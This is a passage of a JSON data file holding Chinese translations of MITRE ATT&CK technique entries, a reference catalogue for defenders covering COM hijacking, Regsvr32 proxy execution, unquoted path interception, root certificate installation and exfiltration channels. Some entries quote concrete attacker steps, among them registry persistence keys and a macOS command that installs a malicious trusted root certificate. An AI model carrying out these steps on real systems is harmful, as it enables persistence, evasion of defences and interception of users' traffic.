        "translated_description": "对手可能会收集有关受害者主机固件的信息，以在目标过程中使用。有关主机固件的信息可能包括各种详细信息，例如特定主机上的类型和版本，这些信息可用于推断有关环境中主机的更多信息（例如：配置、用途、年龄/补丁级别等）。\n\n对手可能通过各种方式收集这些信息，例如通过[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接引诱。有关主机固件的信息可能仅通过在线或其他可访问的数据集（例如：职位发布、网络图、评估报告、简历或采购发票）暴露给对手。(引用: ArsTechnica Intel) 收集这些信息可能会揭示其他形式的侦察机会（例如[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如[供应链妥协](https://attack.mitre.org/techniques/T1195)或[利用公共应用程序](https://attack.mitre.org/techniques/T1190)）。"
    },
    "Encrypted Channel": {
        "translated_name": "加密通道",
        "translated_description": "对手可能会使用加密算法来隐藏命令和控制流量，而不是依赖通信协议提供的任何固有保护。尽管使用了安全算法，如果密钥在恶意软件样本/配置文件中编码和/或生成，这些实现可能容易被逆向工程。"
    },
    "Authentication Package": {
        "translated_name": "认证包",
        "translated_description": "对手可能会滥用认证包在系统启动时执行DLL。Windows认证包DLL由本地安全机构（LSA）进程在系统启动时加载。它们为操作系统提供对多个登录进程和多个安全协议的支持。(引用: MSDN Authentication Packages)\n\n对手可以使用LSA认证包提供的自动启动机制，通过在Windows注册表位置<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code>中放置一个指向二进制文件的引用，并将键值设置为<code>\"Authentication Packages\"=&lt;target binary&gt;</code>来实现持久性。然后，当加载认证包时，系统将执行该二进制文件。"
    },
    "Regsvr32": {
        "translated_name": "Regsvr32",
        "translated_description": "对手可能会滥用Regsvr32.exe来代理执行恶意代码。Regsvr32.exe是一个命令行程序，用于在Windows系统上注册和注销对象链接和嵌入控件，包括动态链接库（DLL）。Regsvr32.exe二进制文件也可能由Microsoft签名。(引用: Microsoft Regsvr32)\n\n恶意使用Regsvr32.exe可能会避免触发安全工具，这些工具可能不会监控regsvr32.exe进程的执行和加载的模块，因为它们被允许列表或Windows使用regsvr32.exe进行正常操作的误报所忽略。Regsvr32.exe还可以使用加载COM脚本的功能来绕过应用程序控制，以用户权限执行DLL。由于Regsvr32.exe支持网络和代理，因此可以通过在调用时传递指向外部Web服务器上的文件的统一资源定位符（URL）来加载脚本。这种方法不会更改注册表，因为COM对象实际上并未注册，只是执行。(引用: LOLBAS Regsvr32) 这种技术变体通常被称为“Squiblydoo”，并已在针对政府的活动中使用。(引用: Carbon Black Squiblydoo Apr 2016)(引用: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe还可以用于注册COM对象，通过[组件对象模型劫持](https://attack.mitre.org/techniques/T1546/015)建立持久性。(引用: Carbon Black Squiblydoo Apr 2016)"
    },
    "Exfiltration to Text Storage Sites": {
        "translated_name": "外传到文本存储站点",
        "translated_description": "对手可能会将数据外传到文本存储站点，而不是他们的主要命令和控制通道。文本存储站点，如<code>pastebin[.]com</code>，通常用于开发人员共享代码和其他信息。\n\n文本存储站点通常用于托管用于C2通信的恶意代码（例如，[阶段能力](https://attack.mitre.org/techniques/T1608)），但对手也可能使用这些站点来外传收集的数据。此外，付费功能和加密选项可能允许对手更安全地隐藏和存储数据。(引用: Pastebin EchoSec)\n\n**注意：** 这与[外传到代码存储库](https://attack.mitre.org/techniques/T1567/001)不同，后者强调通过API访问代码存储库。"
    },
    "Software": {
        "translated_name": "软件",
        "translated_description": "对手可能会收集有关受害者主机软件的信息，以在目标过程中使用。有关安装软件的信息可能包括各种详细信息，例如特定主机上的类型和版本，以及可能指示添加的防御保护（例如：防病毒、SIEM等）的附加组件的存在。\n\n对手可能通过各种方式收集这些信息，例如通过[主动扫描](https://attack.mitre.org/techniques/T1595)（例如：监听端口、服务器横幅、用户代理字符串）或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接收集。对手还可能妥协网站，然后包含旨在从访问者那里收集主机信息的恶意内容。(引用: ATT ScanBox) 有关安装软件的信息也可能通过在线或其他可访问的数据集（例如：职位发布、网络图、评估报告、简历或采购发票）暴露给对手。收集这些信息可能会揭示其他形式的侦察机会（例如[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如[供应链妥协](https://attack.mitre.org/techniques/T1195)或[外部远程服务](https://attack.mitre.org/techniques/T1133)）。"
    },
    "Input Capture": {
        "translated_name": "输入捕获",
        "translated_description": "对手可能会使用捕获用户输入的方法来获取凭证或收集信息。在正常系统使用期间，用户通常会向各种不同的位置提供凭证，例如登录页面/门户或系统对话框。输入捕获机制可能对用户透明（例如，[凭证API挂钩](https://attack.mitre.org/techniques/T1056/004)）或依赖于欺骗用户将输入提供给他们认为是合法服务的内容（例如，[Web门户捕获](https://attack.mitre.org/techniques/T1056/003)）。"
    },
    "Exploits": {
        "translated_name": "漏洞利用",
        "translated_description": "对手可能会购买、窃取或下载可用于目标过程的漏洞利用。漏洞利用利用错误或漏洞，以在计算机硬件或软件上引起意外或未预期的行为。对手可能会找到/修改在线漏洞利用，或从漏洞利用供应商处购买它们。(引用: Exploit Database)(引用: TempertonDarkHotel)(引用: NationsBuying)\n\n除了从互联网上下载免费漏洞利用外，对手还可能从第三方实体购买漏洞利用。第三方实体可以包括专门从事漏洞利用开发的技术公司、犯罪市场（包括漏洞利用工具包）或个人。(引用: PegasusCitizenLab)(引用: Wired SandCat Oct 2019) 除了购买漏洞利用外，对手还可能从第三方实体（包括其他对手）窃取并重新利用漏洞利用。(引用: TempertonDarkHotel)\n\n对手可能会监控漏洞利用提供商论坛，以了解现有漏洞利用的状态以及新发现的漏洞利用。通常在发现漏洞利用和公开之间存在延迟。对手可能会针对已知进行漏洞利用研究和开发的系统，以获取这些知识用于后续操作。\n\n对手可能会在对手生命周期的各个阶段使用漏洞利用（例如，[利用公共应用程序](https://attack.mitre.org/techniques/T1190)、[客户端执行漏洞利用](https://attack.mitre.org/techniques/T1203)、[权限提升漏洞利用](https://attack.mitre.org/techniques/T1068)、[防御规避漏洞利用](https://attack.mitre.org/techniques/T1211)、[凭证访问漏洞利用](https://attack.mitre.org/techniques/T1212)、[远程服务漏洞利用](https://attack.mitre.org/techniques/T1210)和[应用程序或系统漏洞利用](https://attack.mitre.org/techniques/T1499/004)）。"
    },
    "Social Media": {
        "translated_name": "社交媒体",
        "translated_description": "对手可能会搜索社交媒体以获取有关受害者的信息，这些信息可在目标过程中使用。社交媒体网站可能包含有关受害者组织的各种信息，例如业务公告以及员工的角色、位置和兴趣。\n\n对手可能会在不同的社交媒体网站中搜索，具体取决于他们希望收集的信息。威胁行为者可能会被动地从这些网站收集数据，并使用收集的信息创建假冒的个人资料/群组，以诱使受害者透露特定信息（即，[服务钓鱼](https://attack.mitre.org/techniques/T1598/001)）。(引用: Cyware Social Media) 来自这些来源的信息可能会揭示其他形式的侦察机会（例如[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如[建立账户](https://attack.mitre.org/techniques/T1585)或[妥协账户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如[通过服务进行鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1566/003)）。"
    },
    "Customer Relationship Management Software": {
        "translated_name": "客户关系管理软件",
        "translated_description": "对手可能会利用客户关系管理 (CRM) 软件来挖掘有价值的信息。CRM 软件用于帮助组织跟踪和管理客户互动，以及存储客户数据。\n\n一旦对手获得受害组织的访问权限，他们可能会挖掘 CRM 软件以获取客户数据。这可能包括个人身份信息 (PII)，如全名、电子邮件、电话号码和地址，以及购买历史和 IT 支持互动等附加详细信息。通过收集这些数据，对手可能能够发送个性化的[网络钓鱼](https://attack.mitre.org/techniques/T1566)电子邮件，进行 SIM 卡交换，或以其他方式针对组织的客户，以实现财务收益或进一步妥协其他组织。(引用: Bleeping Computer US Cellular Hack 2022)(引用: Bleeping Computer Mint Mobile Hack 2021)(引用: Bleeping Computer Bank Hack 2020)\n\nCRM 软件可以托管在本地或云端。这些解决方案中存储的信息可能因特定实例或环境而异。CRM 软件的示例包括 Microsoft Dynamics 365、Salesforce、Zoho、Zendesk 和 HubSpot。"
    },
    "Component Object Model Hijacking": {
        "translated_name": "组件对象模型劫持",
        "translated_description": "对手可能通过劫持对组件对象模型 (COM) 对象的引用来执行恶意内容，从而建立持久性。COM 是 Windows 中的一个系统，用于通过操作系统实现软件组件之间的交互。(引用: Microsoft Component Object Model) 各种 COM 对象的引用存储在注册表中。\n\n对手可以使用 COM 系统插入恶意代码，通过劫持 COM 引用和关系来执行恶意软件，以实现持久性。劫持 COM 对象需要更改注册表以替换对合法系统组件的引用，这可能导致该组件在执行时无法正常工作。当通过正常系统操作执行该系统组件时，对手的代码将被执行。(引用: GDATA COM Hijacking) 对手可能会劫持频繁使用但不太可能破坏系统稳定性的对象，以保持一致的持久性水平，同时避免导致检测的系统不稳定。"
    },
    "Credentials": {
        "translated_name": "凭证",
        "translated_description": "对手可能会收集可在目标过程中使用的凭证。对手收集的账户凭证可能是直接与目标受害组织相关的，或试图利用用户在个人和业务账户中使用相同密码的倾向。\n\n对手可能通过各种方式从潜在受害者那里收集凭证，例如通过[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接引诱。对手还可能妥协网站，然后添加旨在从访问者那里收集网站认证 Cookie 的恶意内容。(引用: ATT ScanBox) (引用: Register Deloitte)(引用: Register Uber)(引用: Detectify Slack Tokens)(引用: Forbes GitHub Creds)(引用: GitHub truffleHog)(引用: GitHub Gitrob)(引用: CNET Leaks) 在基于带外通信的多因素认证 (MFA) 使用的情况下，对手可能会妥协服务提供商以获取 MFA 代码和一次性密码 (OTP)。(引用: Okta Scatter Swine 2022)\n\n凭证信息也可能通过泄露到在线或其他可访问的数据集（例如：[搜索引擎](https://attack.mitre.org/techniques/T1593/002)、泄露转储、代码存储库等）暴露给对手。对手可能会从暗网市场（如 Russian Market 和 2easy）购买凭证，或通过访问分发信息窃取恶意软件日志的 Telegram 频道获取凭证。(引用: Bleeping Computer 2easy 2021)(引用: SecureWorks Infostealers 2023)(引用: Bleeping Computer Stealer Logs 2023)\n\n收集这些信息可能会揭示其他形式的侦察机会（例如[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)），建立操作资源（例如[妥协账户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如[外部远程服务](https://attack.mitre.org/techniques/T1133)或[有效账户](https://attack.mitre.org/techniques/T1078)）。"
    },
    "Compromise Software Supply Chain": {
        "translated_name": "妥协软件供应链",
        "translated_description": "对手可能会在最终消费者收到应用软件之前操纵该软件，以实现数据或系统妥协。软件供应链的妥协可以通过多种方式进行，包括操纵应用程序源代码、操纵该软件的更新/分发机制，或用修改版本替换已编译的发布版本。\n\n目标可能是特定的受害者集，也可能分发给广泛的消费者，但仅对特定受害者采取额外的策略。(引用: Avast CCleaner3 2018)(引用: Command Five SK 2011)"
    },
    "Rename System Utilities": {
        "translated_name": "重命名系统实用程序",
        "translated_description": "对手可能会重命名合法的系统实用程序，以试图规避与这些实用程序使用相关的安全机制。可能存在针对对手能够滥用的系统实用程序的安全监控和控制机制。(引用: LOLBAS Main Site) 通过在使用之前重命名实用程序（例如：重命名<code>rundll32.exe</code>），可能绕过这些安全机制。(引用: Elastic Masquerade Ball) 另一种情况是，当合法实用程序被复制或移动到不同目录并重命名，以避免基于非标准路径执行系统实用程序的检测。(引用: F-Secure CozyDuke)"
    },
    "Bidirectional Communication": {
        "translated_name": "双向通信",
        "translated_description": "对手可能会使用现有的合法外部 Web 服务作为通过 Web 服务通道向受损系统发送命令和接收输出的一种方式。受损系统可能利用流行的网站和社交媒体托管命令和控制 (C2) 指令。这些受感染的系统可以通过该 Web 服务通道发送命令的输出。返回流量可能以多种方式发生，具体取决于所使用的 Web 服务。例如，返回流量可能采取受损系统在论坛上发布评论、向开发项目发出拉取请求、更新托管在 Web 服务上的文档或发送推文的形式。\n\n作为 C2 机制的流行网站和社交媒体可能提供大量掩护，因为网络中的主机在被破坏之前很可能已经在与它们通信。使用 Google 或 Twitter 等常见服务使对手更容易隐藏在预期的噪音中。Web 服务提供商通常使用 SSL/TLS 加密，为对手提供了额外的保护。"
    },
    "Exploitation for Client Execution": {
        "translated_name": "客户端执行漏洞利用",
        "translated_description": "对手可能会利用客户端应用程序中的软件漏洞来执行代码。由于不安全的编码实践，软件中可能存在漏洞，导致意外行为。对手可以利用某些漏洞通过有针对性的漏洞利用来执行任意代码。通常，对攻击工具包最有价值的漏洞是那些可用于在远程系统上获得代码执行的漏洞，因为它们可用于访问该系统。用户期望看到与他们常用的应用程序相关的文件，因此它们是漏洞研究和开发的有用目标，因为它们具有很高的实用性。\n\n存在几种类型：\n\n### 基于浏览器的漏洞利用\n\nWeb 浏览器是通过[驱动器式妥协](https://attack.mitre.org/techniques/T1189)和[鱼叉式网络钓鱼链接](https://attack.mitre.org/techniques/T1566/002)的常见目标。端点系统可能通过正常的网页浏览或某些用户被目标鱼叉式网络钓鱼电子邮件中的链接引导到对手控制的站点来利用 Web 浏览器。这些通常不需要用户采取行动即可执行漏洞利用。\n\n### 办公应用程序\n\n常见的办公和生产力应用程序（如 Microsoft Office）也通过[网络钓鱼](https://attack.mitre.org/techniques/T1566)成为目标。恶意文件将直接作为附件传输或通过链接下载。这些需要用户打开文档或文件才能运行漏洞利用。\n\n### 常见的第三方应用程序\n\n其他常见或在目标网络中部署的软件应用程序也可能被用于漏洞利用。诸如 Adobe Reader 和 Flash 等应用程序在企业环境中很常见，已被对手常规地用于尝试访问系统。根据软件和漏洞的性质，有些可能在浏览器中被利用，或需要用户打开文件。例如，一些 Flash 漏洞利用已作为 Microsoft Office 文档中的对象传递。"
    },
    "Wordlist Scanning": {
        "translated_name": "字典扫描",
        "translated_description": "对手可能会使用暴力破解和爬行技术迭代探测基础设施。虽然这种技术使用的方法类似于[暴力破解](https://attack.mitre.org/techniques/T1110)，但其目标是识别内容和基础设施，而不是发现有效凭证。扫描中使用的字典可能包含通用的、常用的名称和文件扩展名，或特定软件的术语。对手还可能使用从其他侦察技术（例如：[收集受害者组织信息](https://attack.mitre.org/techniques/T1591)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）中收集的数据创建自定义的、目标特定的字典。\n\n例如，对手可能会使用Web内容发现工具，如Dirb、DirBuster和GoBuster，以及通用或自定义字典来枚举网站的页面和目录。(引用: ClearSky Lebanese Cedar Jan 2021) 这可以帮助他们发现旧的、易受攻击的页面或隐藏的管理门户，这些页面或门户可能成为进一步操作的目标（例如：[利用公共应用程序](https://attack.mitre.org/techniques/T1190)或[暴力破解](https://attack.mitre.org/techniques/T1110)）。\n\n由于云存储解决方案通常使用全局唯一名称，对手还可能使用目标特定的字典和工具，如s3recon和GCPBucketBrute，来枚举云基础设施上的公共和私有存储桶。(引用: S3Recon GitHub)(引用: GCPBucketBrute) 一旦发现存储对象，对手可能会利用[来自云存储的数据](https://attack.mitre.org/techniques/T1530)来访问有价值的信息，这些信息可以被外传或用于提升权限和横向移动。"
    },
    "Spoof Security Alerting": {
        "translated_name": "伪造安全警报",
        "translated_description": "对手可能会伪造来自工具的安全警报，呈现虚假证据以削弱防御者对恶意活动的意识。(引用: BlackBasta) 防御工具生成的消息包含有关潜在安全事件的信息，以及安全软件和系统的运行状态。安全报告消息对于监控系统的正常运行和识别可能表明安全事件的重要事件非常重要。\n\n对手可以伪造安全工具继续运行的正面确认，即使在合法的安全工具已被禁用（例如，[禁用或修改工具](https://attack.mitre.org/techniques/T1562/001)）之后。对手还可以在感染后显示“健康”的系统状态。这可以被滥用以通过延迟防御者的响应来启用进一步的恶意活动。\n\n例如，对手可能会在Windows Defender和其他系统工具被禁用后显示一个伪造的Windows安全GUI和托盘图标，显示“健康”的系统状态。(引用: BlackBasta)"
    },
    "Outlook Home Page": {
        "translated_name": "Outlook主页",
        "translated_description": "对手可能会滥用Microsoft Outlook的主页功能在被破坏的系统上获得持久性。Outlook主页是一个用于自定义Outlook文件夹显示的旧功能。此功能允许加载和显示内部或外部URL，每当打开文件夹时都会加载和显示。可以制作一个恶意的HTML页面，当由Outlook主页加载时会执行代码。(引用: SensePost Outlook Home Page)\n\n一旦恶意主页被添加到用户的邮箱中，它们将在Outlook启动时加载。当加载/重新加载正确的Outlook文件夹时，恶意主页将执行。(引用: SensePost Outlook Home Page)"
    },
    "Asymmetric Cryptography": {
        "translated_name": "非对称加密",
        "translated_description": "对手可能会使用已知的非对称加密算法来隐藏命令和控制流量，而不是依赖通信协议提供的任何固有保护。非对称加密，也称为公钥加密，使用每方的密钥对：一个公钥可以自由分发，另一个私钥。由于密钥的生成方式，发送方使用接收方的公钥加密数据，接收方使用其私钥解密数据。这确保只有预期的接收者可以读取加密数据。常见的公钥加密算法包括RSA和ElGamal。\n\n为了提高效率，许多协议（包括SSL/TLS）在建立连接后使用对称加密，但使用非对称加密来建立或传输密钥。因此，这些协议被归类为[非对称加密](https://attack.mitre.org/techniques/T1573/002)。"
    },
    "Exfiltration to Cloud Storage": {
        "translated_name": "外传到云存储",
        "translated_description": "对手可能会将数据外传到云存储服务，而不是通过其主要命令和控制通道。云存储服务允许通过互联网从远程云存储服务器存储、编辑和检索数据。\n\n云存储服务的示例包括Dropbox和Google Docs。如果网络中的主机已经在与服务通信，外传到这些云存储服务可以为对手提供大量掩护。"
    },
    "Lateral Tool Transfer": {
        "translated_name": "横向工具传输",
        "translated_description": "对手可能会在被破坏的环境中在系统之间传输工具或其他文件。一旦进入受害者环境（即，[入口工具传输](https://attack.mitre.org/techniques/T1105)），文件可能会在操作过程中从一个系统复制到另一个系统，以准备对手工具或其他文件。\n\n对手可能会使用固有的文件共享协议（如通过[SMB/Windows管理员共享](https://attack.mitre.org/techniques/T1021/002)进行文件共享）或通过[远程桌面协议](https://attack.mitre.org/techniques/T1021/001)的认证连接在内部受害者系统之间复制文件。(引用: Unit42 LockerGoga 2019)\n\n文件还可以使用受害者系统上本地或其他存在的工具传输，如scp、rsync、curl、sftp和[ftp](https://attack.mitre.org/software/S0095)。在某些情况下，对手可能能够利用[Web服务](https://attack.mitre.org/techniques/T1102)（如Dropbox或OneDrive）通过共享的、自动同步的文件夹从一台机器复制文件到另一台机器。(引用: Dropbox Malware Sync)"
    },
    "Path Interception by Unquoted Path": {
        "translated_name": "通过未加引号的路径进行路径拦截",
        "translated_description": "对手可能通过劫持易受攻击的文件路径引用来执行他们自己的恶意有效载荷。对手可以利用缺乏引号的路径，通过在路径中的更高级目录中放置可执行文件，使Windows选择对手的可执行文件来启动。\n\n如果路径中有一个或多个空格且未加引号（例如<code>C:\\unsafe path with space\\program.exe</code>与<code>\"C:\\safe path with space\\program.exe\"</code>），服务路径(引用: Microsoft CurrentControlSet Services)和快捷方式路径也可能容易受到路径拦截的攻击。(引用: Help eliminate unquoted path)（存储在Windows注册表键中）对手可以在路径的更高级目录中放置一个可执行文件，Windows将解析该可执行文件而不是预期的可执行文件。例如，如果快捷方式中的路径是<code>C:\\program files\\myapp.exe</code>，对手可能会在<code>C:\\program.exe</code>创建一个程序，该程序将被运行而不是预期的程序。(引用: Windows Unquoted Services)(引用: Windows Privilege Escalation Guide)\n\n如果可执行文件被定期调用，此技术可以用于持久性，如果被拦截的可执行文件由更高权限的进程启动，则可以用于权限提升。"
    },
    "Install Digital Certificate": {
        "translated_name": "安装数字证书",
        "translated_description": "对手可能会安装SSL/TLS证书，以便在目标过程中使用。SSL/TLS证书是可以安装在服务器上的文件，用于在系统之间启用安全通信。数字证书包含有关密钥的信息、有关其所有者身份的信息以及验证证书内容正确的实体的数字签名。如果签名有效，并且检查证书的人信任签名者，那么他们就知道可以使用该密钥与其所有者进行安全通信。证书可以上传到服务器，然后可以配置服务器使用该证书以启用与其的加密通信。(引用: DigiCert Install SSL Cert)\n\n对手可能会安装SSL/TLS证书，以进一步推进他们的操作，例如加密C2流量（例如：[非对称加密](https://attack.mitre.org/techniques/T1573/002)与[Web协议](https://attack.mitre.org/techniques/T1071/001)）或增加凭证收集站点的可信度。数字证书的安装可能发生在多种服务器类型上，包括Web服务器和电子邮件服务器。\n\n对手可以获取数字证书（参见[数字证书](https://attack.mitre.org/techniques/T1588/004)）或创建自签名证书（参见[数字证书](https://attack.mitre.org/techniques/T1587/003)）。然后可以将数字证书安装在对手控制的基础设施上，这些基础设施可能已被获取（[获取基础设施](https://attack.mitre.org/techniques/T1583)）或先前被妥协（[妥协基础设施](https://attack.mitre.org/techniques/T1584)）。"
    },
    "Startup Items": {
        "translated_name": "启动项",
        "translated_description": "对手可能会使用在启动初始化时自动执行的启动项来建立持久性。启动项在启动过程的最后阶段执行，包含shell脚本或其他可执行文件以及系统用于确定所有启动项执行顺序的配置信息。(引用: Startup Items)\n\n这在技术上是一种已弃用的技术（被[启动守护程序](https://attack.mitre.org/techniques/T1543/004)取代），因此适当的文件夹<code>/Library/StartupItems</code>默认情况下可能不存在于系统上，但在macOS Sierra上默认存在。启动项是一个目录，其可执行文件和配置属性列表（plist），<code>StartupParameters.plist</code>，位于顶级目录中。\n\n对手可以在StartupItems目录中创建适当的文件夹/文件来注册他们自己的持久性机制。(引用: Methods of Mac Malware Persistence) 此外，由于启动项在macOS的启动阶段运行，它们将以提升的root用户身份运行。"
    },
    "System Language Discovery": {
        "translated_name": "系统语言发现",
        "translated_description": "对手可能会尝试收集有关受害者系统语言的信息，以推断该主机的地理位置。此信息可能用于塑造后续行为，包括对手是否感染目标和/或尝试特定操作。恶意软件开发人员和操作员可能会使用此决策来降低吸引特定执法机构注意或其他实体审查的风险。(引用: Malware System Language Check)\n\n对手可以使用各种数据源来推断系统语言，例如系统默认设置和键盘布局。具体检查将根据目标和/或对手而有所不同，但可能涉及[查询注册表](https://attack.mitre.org/techniques/T1012)和调用[本机API](https://attack.mitre.org/techniques/T1106)函数的行为。(引用: CrowdStrike Ryuk January 2019)\n\n例如，在Windows系统上，对手可能会尝试通过查询注册表键<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code>或解析Windows API函数<code>GetUserDefaultUILanguage</code>、<code>GetSystemDefaultUILanguage</code>、<code>GetKeyboardLayoutList</code>和<code>GetUserDefaultLangID</code>的输出来推断系统的语言。(引用: Darkside Ransomware Cybereason)(引用: Securelist JSWorm)(引用: SecureList SynAck Doppelgänging May 2018)\n\n在macOS或Linux系统上，对手可能会查询<code>locale</code>以检索<code>$LANG</code>环境变量的值。"
    },
    "Non-Application Layer Protocol": {
        "translated_name": "非应用层协议",
        "translated_description": "对手可能会使用OSI非应用层协议在主机和C2服务器之间或在网络内的受感染主机之间进行通信。可能的协议列表很广泛。(引用: Wikipedia OSI) 具体示例包括使用网络层协议，如互联网控制消息协议（ICMP），传输层协议，如用户数据报协议（UDP），会话层协议，如套接字安全（SOCKS），以及重定向/隧道协议，如串行LAN（SOL）。\n\n主机之间的ICMP通信是一个示例。(引用: Cisco Synful Knock Evolution) 由于ICMP是互联网协议套件的一部分，所有IP兼容主机都必须实现它。(引用: Microsoft ICMP) 然而，它不像其他互联网协议（如TCP或UDP）那样常被监控，可能被对手用来隐藏通信。"
    },
    "Steganography": {
        "translated_name": "隐写术",
        "translated_description": "对手可能会使用隐写术技术隐藏命令和控制流量，使检测工作更加困难。隐写术技术可以用于在系统之间传输的数字消息中隐藏数据。这些隐藏的信息可以用于控制受感染系统。在某些情况下，嵌入隐写术的文件（如图像或文档文件）的传递可以用于命令和控制。"
    },
    "Protocol or Service Impersonation": {
        "translated_name": "协议或服务冒充",
        "translated_description": "对手可能会冒充合法的协议或Web服务流量，以掩盖命令和控制活动并阻碍分析工作。通过冒充合法的协议或Web服务，对手可以使其命令和控制流量与合法的网络流量混合。\n\n对手可能会冒充伪造的SSL/TLS握手，使后续流量看起来是SSL/TLS加密的，可能会干扰某些安全工具，或使流量看起来与受信任的实体相关。\n\n对手还可能利用合法协议冒充预期的Web流量或受信任的服务。例如，对手可能会操纵HTTP头、URI端点、SSL证书和传输的数据，以掩盖C2通信或模仿合法服务，如Gmail、Google Drive和Yahoo Messenger。(引用: ESET Okrum July 2019)(引用: Malleable-C2-U42)"
    },
    "Query Registry": {
        "translated_name": "查询注册表",
        "translated_description": "对手可能会与Windows注册表交互，以收集有关系统、配置和已安装软件的信息。\n\n注册表包含大量有关操作系统、配置、软件和安全性的信息。(引用: Wikipedia Windows Registry) 可以使用[Reg](https://attack.mitre.org/software/S0075)实用程序轻松查询信息，尽管存在其他访问注册表的方法。一些信息可能有助于对手在网络中进一步操作。对手可能会使用[查询注册表](https://attack.mitre.org/techniques/T1012)中的信息在自动发现期间塑造后续行为，包括对手是否完全感染目标和/或尝试特定操作。"
    },
    "Data Transfer Size Limits": {
        "translated_name": "数据传输大小限制",
        "translated_description": "对手可能会将数据以固定大小的块而不是整个文件进行外传，或将数据包大小限制在某些阈值以下。这种方法可能用于避免触发网络数据传输阈值警报。"
    },
    "Web Session Cookie": {
        "translated_name": "Web会话Cookie",
        "translated_description": "对手可以使用窃取的会话Cookie来验证Web应用程序和服务。此技术绕过了一些多因素认证协议，因为会话已经经过身份验证。(引用: Pass The Cookie)\n\n身份验证Cookie通常用于Web应用程序，包括基于云的服务，在用户已验证服务后，以便不传递凭据并且不需要频繁重新验证。即使Web应用程序未被积极使用，Cookie通常也会在较长时间内有效。在通过[窃取Web会话Cookie](https://attack.mitre.org/techniques/T1539)或[Web Cookies](https://attack.mitre.org/techniques/T1606/001)获取Cookie后，对手可能会将Cookie导入他们控制的浏览器中，然后可以在会话Cookie有效的时间内以用户身份使用该站点或应用程序。一旦登录到站点，对手可以访问敏感信息、阅读电子邮件或执行受害者账户有权限执行的操作。\n\n已经有恶意软件针对会话Cookie以绕过多因素认证系统的示例。(引用: Unit 42 Mac Crypto Cookies January 2019)"
    },
    "Domain Accounts": {
        "translated_name": "域账户",
        "translated_description": "对手可能会获取和滥用域账户的凭据，作为获得初始访问、持久性、权限提升或规避防御的一种手段。(引用: TechNet Credential Theft) 域账户是由Active Directory域服务管理的账户，访问和权限配置在属于该域的系统和服务中。域账户可以覆盖用户、管理员和服务。(引用: Microsoft AD Accounts)\n\n对手可能通过各种手段（如[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)或密码重用）来妥协域账户，其中一些具有高权限，从而访问域的特权资源。"
    },
    "Regsvcs/Regasm": {
        "translated_name": "Regsvcs/Regasm",
        "translated_description": "对手可能会滥用Regsvcs和Regasm，通过受信任的Windows实用程序代理执行代码。Regsvcs和Regasm是用于注册.NET [组件对象模型](https://attack.mitre.org/techniques/T1559/001) (COM) 程序集的Windows命令行实用程序。两者都是可能由Microsoft数字签名的二进制文件。(引用: MSDN Regsvcs)(引用: MSDN Regasm)\n\n这两个实用程序可以通过使用二进制文件中的属性来指定在注册或注销之前应运行的代码来绕过应用程序控制：<code>[ComRegisterFunction]</code>或<code>[ComUnregisterFunction]</code>。即使进程在权限不足的情况下运行并且执行失败，带有注册和注销属性的代码也会执行。(引用: LOLBAS Regsvcs)(引用: LOLBAS Regasm)"
    },
    "Install Root Certificate": {
        "translated_name": "安装根证书",
        "translated_description": "对手可能会在被破坏的系统上安装根证书，以避免连接到对手控制的Web服务器时出现警告。根证书用于公钥加密中，以识别根证书颁发机构 (CA)。当安装根证书时，系统或应用程序将信任由根证书签名的证书链中的证书。(引用: Wikipedia Root Certificate) 证书通常用于在Web浏览器中建立安全的TLS/SSL通信。当用户尝试浏览呈现不受信任证书的网站时，将显示错误消息以警告用户安全风险。根据安全设置，浏览器可能不允许用户与网站建立连接。\n\n在被破坏的系统上安装根证书将为对手提供一种降低系统安全性的方法。对手已使用此技术避免在被破坏的系统通过HTTPS连接到对手控制的Web服务器时出现安全警告，这些服务器伪装成合法网站以收集登录凭据。(引用: Operation Emmental)\n\n非典型根证书也已由制造商或在软件供应链中预安装，并与恶意软件/广告软件结合使用，以提供[中间人攻击](https://attack.mitre.org/techniques/T1557)能力，用于拦截通过安全TLS/SSL通信传输的信息。(引用: Kaspersky Superfish)\n\n根证书（及其相关链）也可以被克隆和重新安装。克隆的证书链将携带许多与源相同的元数据特征，并可用于签署恶意代码，从而绕过用于阻止执行和/或发现持久性工件的签名验证工具（如：Sysinternals、防病毒等）。(引用: SpectorOps Code Signing Dec 2017)\n\n在macOS中，Ay MaMi恶意软件使用<code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code>将恶意证书作为受信任的根证书安装到系统钥匙串中。(引用: objective-see ay mami 2018)"
    },
    "Network Logon Script": {
        "translated_name": "网络登录脚本",
        "translated_description": "对手可能会使用在登录初始化时自动执行的网络登录脚本来建立持久性。网络登录脚本可以使用Active Directory或组策略对象分配。(引用: Petri Logon Script AD) 这些登录脚本以分配给它们的用户的权限运行。根据网络中的系统，初始化这些脚本可能适用于一个或多个甚至所有系统。\n\n对手可能会使用这些脚本在网络上保持持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员账户。"
    },
    "Endpoint Denial of Service": {
        "translated_name": "端点拒绝服务",
